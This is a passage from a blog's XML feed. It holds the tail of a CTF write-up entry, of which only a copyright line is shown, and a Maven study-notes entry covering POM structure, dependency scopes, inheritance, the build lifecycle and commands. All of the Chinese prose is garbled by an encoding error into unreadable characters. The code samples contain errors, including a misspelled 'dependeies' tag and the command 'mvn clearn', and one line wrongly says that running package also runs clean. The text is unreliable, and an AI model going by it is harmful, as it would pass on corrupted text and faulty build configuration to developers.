<br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mavenå­¦ä¹ ç¬”è®°</title>
      <link href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="mavenå­¦ä¹ ç¬”è®°"><a href="#mavenå­¦ä¹ ç¬”è®°" class="headerlink" title="mavenå­¦ä¹ ç¬”è®°"></a>mavenå­¦ä¹ ç¬”è®°</h1><h2 id="å­¦ä¹ ç½‘ç«™"><a href="#å­¦ä¹ ç½‘ç«™" class="headerlink" title="å­¦ä¹ ç½‘ç«™"></a>å­¦ä¹ ç½‘ç«™</h2><p> <a href="https://www.imooc.com/learn/443" target="_blank" rel="noopener">https://www.imooc.com/learn/443</a> (è¿™ä¸ªæŒºå¥½çš„)</p><p> <a href="https://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-tutorial.html</a> </p><h2 id="mavenåŠŸèƒ½"><a href="#mavenåŠŸèƒ½" class="headerlink" title="mavenåŠŸèƒ½"></a>mavenåŠŸèƒ½</h2><ul><li>æ„å»º</li><li>æ–‡æ¡£ç”Ÿæˆ</li><li>æŠ¥å‘Š</li><li>ä¾èµ–</li><li>SCMs</li><li>å‘å¸ƒ</li><li>åˆ†å‘</li><li>é‚®ä»¶åˆ—è¡¨</li></ul><h2 id="çº¦å®šé…ç½®"><a href="#çº¦å®šé…ç½®" class="headerlink" title="çº¦å®šé…ç½®"></a>çº¦å®šé…ç½®</h2><p>Maven æå€¡ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„æ ‡å‡†ç›®å½•ç»“æ„ï¼ŒMaven ä½¿ç”¨çº¦å®šä¼˜äºé…ç½®çš„åŸåˆ™ï¼Œå¤§å®¶å°½å¯èƒ½çš„éµå®ˆè¿™æ ·çš„ç›®å½•ç»“æ„ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th align="left">ç›®å½•</th><th align="left">ç›®çš„</th></tr></thead><tbody><tr><td align="left">${basedir}</td><td align="left">å­˜æ”¾pom.xmlå’Œæ‰€æœ‰çš„å­ç›®å½•</td></tr><tr><td align="left">${basedir}/src/main/java</td><td align="left">é¡¹ç›®çš„javaæºä»£ç </td></tr><tr><td align="left">${basedir}/src/main/resources</td><td align="left">é¡¹ç›®çš„èµ„æºï¼Œæ¯”å¦‚è¯´propertyæ–‡ä»¶ï¼Œspringmvc.xml</td></tr><tr><td align="left">${basedir}/src/test/java</td><td align="left">é¡¹ç›®çš„æµ‹è¯•ç±»ï¼Œæ¯”å¦‚è¯´Junitä»£ç </td></tr><tr><td align="left">${basedir}/src/test/resources</td><td align="left">æµ‹è¯•ç”¨çš„èµ„æº</td></tr><tr><td align="left">${basedir}/src/main/webapp/WEB-INF</td><td align="left">webåº”ç”¨æ–‡ä»¶ç›®å½•ï¼Œwebé¡¹ç›®çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å­˜æ”¾web.xmlã€æœ¬åœ°å›¾ç‰‡ã€jspè§†å›¾é¡µé¢</td></tr><tr><td align="left">${basedir}/target</td><td align="left">æ‰“åŒ…è¾“å‡ºç›®å½•</td></tr><tr><td align="left">${basedir}/target/classes</td><td align="left">ç¼–è¯‘è¾“å‡ºç›®å½•</td></tr><tr><td align="left">${basedir}/target/test-classes</td><td align="left">æµ‹è¯•ç¼–è¯‘è¾“å‡ºç›®å½•</td></tr><tr><td align="left">Test.java</td><td align="left">Mavenåªä¼šè‡ªåŠ¨è¿è¡Œç¬¦åˆè¯¥å‘½åè§„åˆ™çš„æµ‹è¯•ç±»</td></tr><tr><td align="left">~/.m2/repository</td><td align="left">Mavené»˜è®¤çš„æœ¬åœ°ä»“åº“ç›®å½•ä½ç½®</td></tr></tbody></table><h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Modelï¼Œé¡¹ç›®å¯¹è±¡æ¨¡å‹ ) æ˜¯ Maven å·¥ç¨‹çš„åŸºæœ¬å·¥ä½œå•å…ƒï¼Œæ˜¯ä¸€ä¸ªXMLæ–‡ä»¶ ,ç”¨äºæè¿°å¦‚ä½•æ„å»ºé¡¹ç›®</p><p>åœ¨åˆ›å»º POM ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æè¿°é¡¹ç›®ç»„ (groupId), é¡¹ç›®çš„å”¯ä¸€IDã€‚ </p><h3 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;    &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;    &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;    &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;    &lt;!-- ç‰ˆæœ¬å· --&gt;    &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt;</code></pre><h3 id="å¸¸è§æ ‡ç­¾è§£é‡Š"><a href="#å¸¸è§æ ‡ç­¾è§£é‡Š" class="headerlink" title="å¸¸è§æ ‡ç­¾è§£é‡Š"></a>å¸¸è§æ ‡ç­¾è§£é‡Š</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;    &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;    &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;    &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;    &lt;!-- ç‰ˆæœ¬å·     ç¬¬ä¸€ä¸ªæ•°å­—è¡¨ç¤ºå¤§ç‰ˆæœ¬å·    ç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºåˆ†æ”¯ç‰ˆæœ¬å·    ç¬¬ä¸‰ä¸ªæ•°å­—è¡¨ç¤ºå°ç‰ˆæœ¬å·    snapshot å¿«ç…§    alpha å†…éƒ¨æµ‹è¯•    beta å…¬æµ‹    Release ç¨³å®šç‰ˆæœ¬    GA æ­£å¼å‘å¸ƒ    --&gt;    &lt;version&gt;1.0.0-xxx&lt;/version&gt;    &lt;!-- æ‰“åŒ…æ–¹å¼ï¼Œé»˜è®¤æ˜¯jar,è¿˜æœ‰:war zip pom--&gt;    &lt;packaging&gt;&lt;/packaging&gt;    &lt;!--é¡¹ç›®æè¿°å--&gt;    &lt;name&gt;&lt;/name&gt;    &lt;!--é¡¹ç›®åœ°å€ --&gt;    &lt;url&gt;&lt;/url&gt;    &lt;!--é¡¹ç›®æè¿° --&gt;    &lt;descriptions&gt;&lt;/descriptions&gt;    &lt;!--å¼€å‘äººå‘˜ä¿¡æ¯ --&gt;    &lt;developers&gt;&lt;/developers&gt;    &lt;dependeies&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.companyname.project-group(å…¬å¸ç½‘ç«™åå†™+é¡¹ç›®å)&lt;/groupId&gt;            &lt;artifactId&gt;project+æ¨¡å—å&lt;/artifactId&gt;            &lt;version&gt;1.0.0-xxx&lt;/version&gt;            &lt;type&gt;&lt;/type&gt;            &lt;!-- åœ¨testä¸­æœ‰ç”¨ --&gt;            &lt;scope&gt;test&lt;/scope&gt;            &lt;!--è®¾ç½®ä¾èµ–æ˜¯å¦å¯é€‰ï¼Œé»˜è®¤Falseï¼Œè®¾ä¸ºFalseåˆ™å­é¡¹ç›®é»˜è®¤ç»§æ‰¿ï¼Œå¦åˆ™å¾—æ˜¾ç¤ºå£°æ˜--&gt;            &lt;optional&gt;&lt;/optional&gt;            &lt;!-- æ’é™¤ä¾èµ–ä¼ é€’åˆ—è¡¨                å¦‚Aä¾èµ–Bï¼ŒBä¾èµ–Cï¼Œè€ŒAä¸ä¾èµ–Cï¼Œæ­¤æ—¶å°±å¯ä»¥åœ¨æ­¤å¤„æ·»åŠ Cï¼Œæ¥æ’é™¤ä¾èµ–             --&gt;            &lt;exclusions&gt;                &lt;exclusion&gt;                &lt;/exclusion&gt;            &lt;/exclusions&gt;        &lt;/dependency&gt;    &lt;/dependeies&gt;    &lt;!-- ä¾èµ–çš„ç®¡ç†ï¼Œå­pomè‡ªåŠ¨ç»§æ‰¿ï¼Œä½†æ˜¯æœ¬èº«å¹¶ä¸ä¾èµ– --&gt;    &lt;dependencyManagement&gt;       &lt;dependeies&gt;            &lt;dependency&gt;           &lt;/dependency&gt;        &lt;/dependeies&gt;     &lt;/dependencyManagement&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;!-- è¯¦æƒ…è§åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶ --&gt;        &lt;/plugins&gt;    &lt;/build&gt;    &lt;!-- èšåˆè¿è¡Œå¤šä¸ªmavené¡¹ç›®,ä¸€å£æ°”å…¨éƒ¨ç¼–è¯‘ --&gt;    &lt;modules&gt;        &lt;module&gt;        &lt;/module&gt;    &lt;/modules&gt;&lt;/project&gt;</code></pre><h3 id="æ‰§è¡Œmainå‡½æ•°"><a href="#æ‰§è¡Œmainå‡½æ•°" class="headerlink" title="æ‰§è¡Œmainå‡½æ•°"></a>æ‰§è¡Œmainå‡½æ•°</h3><p>åœ¨pomä¸‹çš„projectæ·»åŠ ï¼š</p><pre><code class="xml">&lt;build&gt; &lt;plugins&gt;  &lt;plugin&gt;   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;   &lt;version&gt;1.1.1&lt;/version&gt;   &lt;executions&gt;    &lt;execution&gt;     &lt;phase&gt;test&lt;/phase&gt;     &lt;goals&gt;      &lt;goal&gt;java&lt;/goal&gt;     &lt;/goals&gt;     &lt;configuration&gt;      &lt;mainClass&gt;com.vineetmanohar.module.CodeGenerator&lt;/mainClass&gt;      &lt;arguments&gt;       &lt;argument&gt;arg0&lt;/argument&gt;       &lt;argument&gt;arg1&lt;/argument&gt;      &lt;/arguments&gt;     &lt;/configuration&gt;    &lt;/execution&gt;   &lt;/executions&gt;  &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt;</code></pre><h3 id="ä¾èµ–èŒƒå›´"><a href="#ä¾èµ–èŒƒå›´" class="headerlink" title="ä¾èµ–èŒƒå›´"></a>ä¾èµ–èŒƒå›´</h3><ul><li>compile<br>é»˜è®¤çš„èŒƒå›´ï¼Œç¼–è¯‘æµ‹è¯•è¿è¡Œéƒ½æœ‰æ•ˆ</li><li>provided<br>åœ¨æµ‹è¯•å’Œç¼–è¯‘æ—¶æœ‰æ•ˆ</li><li>runtime<br>åœ¨æµ‹è¯•å’Œè¿è¡Œæ—¶æœ‰æ•ˆ</li><li>test<br>åªæœ‰åœ¨æµ‹è¯•ä¸­æœ‰æ•ˆ</li></ul><h3 id="æ’é™¤ä¾èµ–"><a href="#æ’é™¤ä¾èµ–" class="headerlink" title="æ’é™¤ä¾èµ–"></a>æ’é™¤ä¾èµ–</h3><p>åœ¨pomä¸­çš„projectä¸‹æ·»åŠ </p><pre><code class="xml">&lt;!-- æ’é™¤ä¾èµ–ä¼ é€’åˆ—è¡¨                å¦‚Aä¾èµ–Bï¼ŒBä¾èµ–Cï¼Œè€ŒAä¸ä¾èµ–Cï¼Œæ­¤æ—¶å°±å¯ä»¥åœ¨æ­¤å¤„æ·»åŠ Cï¼Œæ¥æ’é™¤ä¾èµ–             --&gt;            &lt;exclusions&gt;                &lt;exclusion&gt;                &lt;/exclusion&gt;            &lt;/exclusions&gt;</code></pre><h3 id="ä¾èµ–å†²çªè§£å†³åŸåˆ™"><a href="#ä¾èµ–å†²çªè§£å†³åŸåˆ™" class="headerlink" title="ä¾èµ–å†²çªè§£å†³åŸåˆ™"></a>ä¾èµ–å†²çªè§£å†³åŸåˆ™</h3><h4 id="çŸ­è·¯ä¼˜å…ˆ"><a href="#çŸ­è·¯ä¼˜å…ˆ" class="headerlink" title="çŸ­è·¯ä¼˜å…ˆ"></a>çŸ­è·¯ä¼˜å…ˆ</h4><pre><code>A -&gt; B -&gt; C -&gt; X1A -&gt; D -&gt; X2#A -&gt; Dä»£è¡¨ Aä¾èµ–äºDæ­¤æ—¶Aä¾èµ–äºX2</code></pre><h4 id="å…ˆå£°æ˜å…ˆä¼˜å…ˆ"><a href="#å…ˆå£°æ˜å…ˆä¼˜å…ˆ" class="headerlink" title="å…ˆå£°æ˜å…ˆä¼˜å…ˆ"></a>å…ˆå£°æ˜å…ˆä¼˜å…ˆ</h4><p>å¦‚æœè·¯å¾„é•¿åº¦ç›¸åŒ(ä¾èµ–é“¾)ï¼Œåˆ™è°å…ˆå£°æ˜ï¼Œå…ˆè§£æè°</p><h3 id="èšåˆ"><a href="#èšåˆ" class="headerlink" title="èšåˆ"></a>èšåˆ</h3><p>åœ¨å®¹å™¨pomä¸­ä¿®æ”¹packagingä¸ºpomï¼Œæ·»åŠ modules</p><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ç°æœ‰mavené¡¹ç›®:maven01å’Œmaven02</p><p>æ–°å»ºmavené¡¹ç›®ï¼šmaven03,ä¸‰ä¸ªé¡¹ç›®å‡åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹</p><p>åœ¨maven03ä¸­ä¿®æ”¹packagingä¸ºpomï¼Œæ·»åŠ å¦‚ä¸‹modules</p><pre><code class="xml">&lt;modules&gt;    &lt;module&gt;        ../maven01    &lt;/module&gt;    &lt;module&gt;        ../maven02    &lt;/module&gt;&lt;/modules&gt;</code></pre><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>å½“å¤šä¸ªmavenæ¨¡å—éƒ½ä¾èµ–ä¸€ä¸ªç›¸åŒçš„åº“æ—¶ï¼Œå¤šæ¬¡å£°æ˜æ˜¾å¾—å¤ªéº»çƒ¦æ­¤æ—¶å¯ä»¥ç”¨ç»§æ‰¿æ¥è§£å†³</p><h4 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ç°æœ‰ä¸¤ä¸ªmavené¡¹ç›®(maven01,maven02)éƒ½ä½¿ç”¨junit:3.8.1</p><p>æ–°å»ºçˆ¶mavené¡¹ç›®:maven03ï¼Œå…¶å¯¹åº”çš„pomæ–‡ä»¶ä¸ºï¼š</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;  &lt;artifactId&gt;maven03&lt;/artifactId&gt;  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;pom&lt;/packaging&gt;  &lt;name&gt;maven03&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;    &lt;dependencyManagement&gt;      &lt;dependencies&gt;        &lt;dependency&gt;          &lt;groupId&gt;junit&lt;/groupId&gt;          &lt;artifactId&gt;junit&lt;/artifactId&gt;          &lt;version&gt;3.8.1&lt;/version&gt;          &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;          &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;&lt;/project&gt;</code></pre><p>å°†ç›¸åŒçš„ä¾èµ–éƒ½æ·»åŠ åˆ°dependencyManagementä¸‹ï¼Œå¹¶ä¿®æ”¹packagingä¸ºpom</p><p>maven01å’Œmaven02çš„pomæ–‡ä»¶å‡ä¸ºï¼š</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;  &lt;artifactId&gt;maven02&lt;/artifactId&gt;  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;jar&lt;/packaging&gt;  &lt;name&gt;maven02&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;    &lt;parent&gt;      &lt;groupId&gt;top.ccreater&lt;/groupId&gt;      &lt;artifactId&gt;maven03(/maven02)&lt;/artifactId&gt;      &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;    &lt;/parent&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;junit&lt;/groupId&gt;      &lt;artifactId&gt;junit&lt;/artifactId&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>æ‰€æœ‰çš„ POM éƒ½ç»§æ‰¿è‡ªä¸€ä¸ªçˆ¶ POMï¼ˆæ— è®ºæ˜¯å¦æ˜¾å¼å®šä¹‰äº†è¿™ä¸ªçˆ¶ POMï¼‰ã€‚çˆ¶ POM ä¹Ÿè¢«ç§°ä½œ <strong>Super POM</strong>ï¼Œå®ƒåŒ…å«äº†ä¸€äº›å¯ä»¥è¢«ç»§æ‰¿çš„é»˜è®¤è®¾ç½®ã€‚</p><p>Maven ä½¿ç”¨ effective pomï¼ˆSuper pom åŠ ä¸Šå·¥ç¨‹è‡ªå·±çš„é…ç½®ï¼‰æ¥æ‰§è¡Œç›¸å…³çš„ç›®æ ‡ï¼Œå®ƒå¸®åŠ©å¼€å‘è€…åœ¨ pom.xml ä¸­åšå°½å¯èƒ½å°‘çš„é…ç½®ï¼Œå½“ç„¶è¿™äº›é…ç½®å¯ä»¥è¢«æ–¹ä¾¿çš„é‡å†™ã€‚</p><p>æŸ¥çœ‹ Super POM é»˜è®¤é…ç½®çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<strong>mvn help:effective-pom</strong> ï¼ˆéœ€è¦åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªpom.xmlï¼‰</p><h3 id="POM-æ ‡ç­¾è¯¦è§£"><a href="#POM-æ ‡ç­¾è¯¦è§£" class="headerlink" title="POM æ ‡ç­¾è¯¦è§£"></a>POM æ ‡ç­¾è¯¦è§£</h3><p><a href="https://www.runoob.com/maven/maven-pom.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-pom.html</a></p><h2 id="Maven-æ„å»ºç”Ÿå‘½å‘¨æœŸ"><a href="#Maven-æ„å»ºç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Maven æ„å»ºç”Ÿå‘½å‘¨æœŸ"></a>Maven æ„å»ºç”Ÿå‘½å‘¨æœŸ</h2><p> Maven æ„å»ºç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸€ä¸ªé¡¹ç›®æ„å»ºè·Ÿå‘å¸ƒçš„è¿‡ç¨‹ã€‚ </p><p>Maven æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ ‡å‡†çš„ç”Ÿå‘½å‘¨æœŸï¼š</p><ul><li><strong>clean</strong>ï¼šé¡¹ç›®æ¸…ç†çš„å¤„ç†</li><li><strong>default(æˆ– build)</strong>ï¼šé¡¹ç›®éƒ¨ç½²çš„å¤„ç†</li><li><strong>site</strong>ï¼šé¡¹ç›®ç«™ç‚¹æ–‡æ¡£åˆ›å»ºçš„å¤„ç†</li></ul><h3 id="å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ"><a href="#å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ" class="headerlink" title="å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ"></a>å…¸å‹çš„ç”Ÿå‘½æ„å»ºå‘¨æœŸ</h3><table><thead><tr><th align="left">é˜¶æ®µ</th><th align="left">å¤„ç†</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">éªŒè¯ validate</td><td align="left">éªŒè¯é¡¹ç›®</td><td align="left">éªŒè¯é¡¹ç›®æ˜¯å¦æ­£ç¡®ä¸”æ‰€æœ‰å¿…é¡»ä¿¡æ¯æ˜¯å¯ç”¨çš„</td></tr><tr><td align="left">ç¼–è¯‘ compile</td><td align="left">æ‰§è¡Œç¼–è¯‘</td><td align="left">æºä»£ç ç¼–è¯‘åœ¨æ­¤é˜¶æ®µå®Œæˆ</td></tr><tr><td align="left">æµ‹è¯• Test</td><td align="left">æµ‹è¯•</td><td align="left">ä½¿ç”¨é€‚å½“çš„å•å…ƒæµ‹è¯•æ¡†æ¶ï¼ˆä¾‹å¦‚JUnitï¼‰è¿è¡Œæµ‹è¯•ã€‚</td></tr><tr><td align="left">åŒ…è£… package</td><td align="left">æ‰“åŒ…</td><td align="left">åˆ›å»ºJAR/WARåŒ…å¦‚åœ¨ pom.xml ä¸­å®šä¹‰æåŠçš„åŒ…</td></tr><tr><td align="left">æ£€æŸ¥ verify</td><td align="left">æ£€æŸ¥</td><td align="left">å¯¹é›†æˆæµ‹è¯•çš„ç»“æœè¿›è¡Œæ£€æŸ¥ï¼Œä»¥ä¿è¯è´¨é‡è¾¾æ ‡</td></tr><tr><td align="left">å®‰è£… install</td><td align="left">å®‰è£…</td><td align="left">å®‰è£…æ‰“åŒ…çš„é¡¹ç›®åˆ°æœ¬åœ°ä»“åº“ï¼Œä»¥ä¾›å…¶ä»–é¡¹ç›®ä½¿ç”¨</td></tr><tr><td align="left">éƒ¨ç½² deploy</td><td align="left">éƒ¨ç½²</td><td align="left">æ‹·è´æœ€ç»ˆçš„å·¥ç¨‹åŒ…åˆ°è¿œç¨‹ä»“åº“ä¸­ï¼Œä»¥å…±äº«ç»™å…¶ä»–å¼€å‘äººå‘˜å’Œå·¥ç¨‹</td></tr></tbody></table><p>å¦‚æœæ‰§è¡Œpackageï¼Œé‚£ä¹ˆclean,testç­‰éƒ½ä¼šè¢«æ‰§è¡Œ</p><h3 id="æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ"><a href="#æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ" class="headerlink" title="æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ"></a>æ„å»ºé˜¶æ®µç”±æ’ä»¶ç›®æ ‡æ„æˆ</h3><p> ä¸€ä¸ªæ’ä»¶ç›®æ ‡ä»£è¡¨ä¸€ä¸ªç‰¹å®šçš„ä»»åŠ¡ï¼ˆæ¯”æ„å»ºé˜¶æ®µæ›´ä¸ºç²¾ç»†ï¼‰ï¼Œè¿™æœ‰åŠ©äºé¡¹ç›®çš„æ„å»ºå’Œç®¡ç†ã€‚è¿™äº›ç›®æ ‡å¯èƒ½è¢«ç»‘å®šåˆ°å¤šä¸ªé˜¶æ®µæˆ–è€…æ— ç»‘å®šã€‚ä¸ç»‘å®šåˆ°ä»»ä½•æ„å»ºé˜¶æ®µçš„ç›®æ ‡å¯ä»¥åœ¨æ„å»ºç”Ÿå‘½å‘¨æœŸä¹‹å¤–é€šè¿‡ç›´æ¥è°ƒç”¨æ‰§è¡Œã€‚è¿™äº›ç›®æ ‡çš„æ‰§è¡Œé¡ºåºå–å†³äºè°ƒç”¨ç›®æ ‡å’Œæ„å»ºé˜¶æ®µçš„é¡ºåºã€‚ </p><p>æ’ä»¶ç›®æ ‡è§£é‡Šï¼š ä¸€ä¸ªæ’ä»¶æœ‰å¤šä¸ªç›®æ ‡ï¼Œæ¯ä¸ªåŠŸèƒ½å°±æ˜¯ä¸€ä¸ª<em>æ’ä»¶ç›®æ ‡</em>ï¼Œæ‰€ä»¥ä¸€ä¸ªæ’ä»¶æœ‰å¤šä¸ªåŠŸèƒ½ã€‚ </p><h2 id="maven-å¸¸ç”¨å‘½ä»¤"><a href="#maven-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="maven å¸¸ç”¨å‘½ä»¤"></a>maven å¸¸ç”¨å‘½ä»¤</h2><pre><code class="shell">mvn -vmvn compile ç¼–è¯‘mvn test æµ‹è¯•mvn package æ‰“åŒ…é¡¹ç›®ç”Ÿæˆjaræ–‡ä»¶mvn clearn åˆ é™¤target ç›®å½•mvn install å®‰è£…jaråŒ…åˆ°æœ¬åœ°ä»“åº“åˆ›å»ºç›®å½•çš„ä¸¤ç§æ–¹å¼1. äº¤äº’å¼mvn archetype:generate 2. éäº¤äº’å¼mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</code></pre><h2 id="åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶"><a href="#åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶" class="headerlink" title="åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶"></a>åœ¨æŸä¸ªé˜¶æ®µä½¿ç”¨æ’ä»¶</h2><p> <a href="http://maven.apache.org/plugins" target="_blank" rel="noopener">http://maven.apache.org/plugins</a> </p><p>å„ä¸ªæ’ä»¶ä¸‹æœ‰ä¸ªexample configå¦‚ï¼š <a href="http://maven.apache.org/plugins/maven-source-plugin/" target="_blank" rel="noopener">http://maven.apache.org/plugins/maven-source-plugin/</a> </p><p>åœ¨pom.xmlæ–‡ä»¶ä¸­projectä¸‹æ·»åŠ </p><pre><code class="xml">&lt;build&gt;    &lt;plugins&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;        &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;        &lt;version&gt;3.2.0&lt;/version&gt;        &lt;!--  &lt;configuration&gt;          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;          &lt;attach&gt;false&lt;/attach&gt;        &lt;/configuration&gt;--&gt;        &lt;executions&gt;            &lt;execution&gt;                &lt;phase&gt;package&lt;/phase&gt;                &lt;goals&gt;                &lt;goal&gt;jar-no-fork&lt;/goal&gt;                &lt;!-- åœ¨packageé˜¶æ®µæ‰§è¡Œsource:jar-no-fork --&gt;            &lt;/goals&gt;            &lt;/execution&gt;        &lt;/executions&gt;      &lt;/plugin&gt;   